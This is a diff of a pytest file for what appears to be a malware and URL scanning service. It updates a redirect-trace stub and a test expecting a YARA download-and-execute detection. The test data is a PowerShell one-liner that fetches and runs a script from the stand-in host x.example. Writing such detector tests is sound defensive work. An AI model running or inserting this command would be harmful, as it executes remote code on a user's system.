@@ -46,7 +46,8 @@ def seed_urlhaus(db: Session) -> None:
 
 def reachable(monkeypatch: pytest.MonkeyPatch, *hops: Hop) -> None:
     monkeypatch.setattr(
-        "app.analyzers.url_scan.trace_redirects", lambda url: RedirectTrace(hops=list(hops))
+        "app.analyzers.url_scan.trace_redirects",
+        lambda url, read_final_body=False: RedirectTrace(hops=list(hops)),
     )
 
 
@@ -339,7 +340,10 @@ def test_pdf_with_auto_running_javascript(client: TestClient) -> None:
 def test_download_and_execute_script(client: TestClient) -> None:
     script = b"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\n"
     scan = scan_file(client, "setup.ps1", script)
-    assert any(f["category"] == "suspicious_script" for f in scan["findings"])
+    match = next(f for f in scan["findings"] if f["category"] == "yara_match")
+    assert match["title"] == "Downloads and immediately runs code from the internet"
+    assert match["evidence"]["rule"] == "SENTINEL_Download_And_Execute"
+    assert any(c["key"] == "yara" and c["status"] == "completed" for c in scan["checks"])
 
 
 def test_samples_are_deleted_and_stored_under_random_names(
